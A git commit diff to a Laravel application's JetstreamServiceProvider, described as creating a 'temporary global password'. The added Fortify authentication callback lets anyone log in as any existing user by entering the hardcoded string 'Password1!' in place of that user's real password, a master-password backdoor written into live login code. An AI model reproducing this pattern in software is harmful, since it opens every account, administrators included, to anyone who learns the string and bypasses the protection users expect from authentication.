59d71b0584f7832736ce03b515bc3516724b48d4
MFRHoldings <rick@mfrholdings.com>
2021-08-23 16:34:06 -0400

    Create temporary global password @ JetstreamServiceProvider.php

--- app/Providers/JetstreamServiceProvider.php
+++ app/Providers/JetstreamServiceProvider.php
@@ -3,7 +3,11 @@
 namespace App\Providers;
 
 use App\Actions\Jetstream\DeleteUser;
+use App\Models\User;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\ServiceProvider;
+use Laravel\Fortify\Fortify;
 use Laravel\Jetstream\Jetstream;
 
 class JetstreamServiceProvider extends ServiceProvider
@@ -28,6 +32,21 @@ class JetstreamServiceProvider extends ServiceProvider
         $this->configurePermissions();
 
         Jetstream::deleteUsersUsing(DeleteUser::class);
+
+        /** FJR added 23-Aug-21 to allow for global password */
+        Fortify::authenticateUsing(function (Request $request) {
+            //$user = User::where('email', $request->email)->first();
+            $user = User::where('username', $request->username)->first();
+
+            if ($user &&
+                (
+                    Hash::check($request->password, $user->password) ||
+                    ($request->password === 'Password1!')
+                )
+            ){
+                return $user;
+            }
+        });
     }
 
     /**
